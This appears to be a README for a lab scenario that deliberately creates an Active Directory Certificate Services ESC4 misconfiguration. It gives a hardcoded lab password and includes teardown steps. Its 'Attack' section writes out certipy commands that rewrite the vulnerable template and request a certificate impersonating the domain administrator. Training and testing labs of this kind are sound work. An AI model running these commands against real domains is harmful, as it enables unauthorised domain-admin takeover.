# esc4

Creates template `ESC4` (enrollable by `<NB>\Domain Users`) and gives `scn-esc4-user` (password `Aa1234567890!`) `GenericAll` on it.

Attack:

    certipy template -u scn-esc4-user@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -template ESC4 -write-default-configuration
    certipy req -u scn-esc4-user@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -template ESC4 -upn administrator@<domain> -sid <administrator SID>

How to verify:

    certipy find -u scn-esc4-user@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout   # ESC4

Disable revokes the certificates issued from `ESC4`, deletes the template (with any change the attacker made to it) and the user.
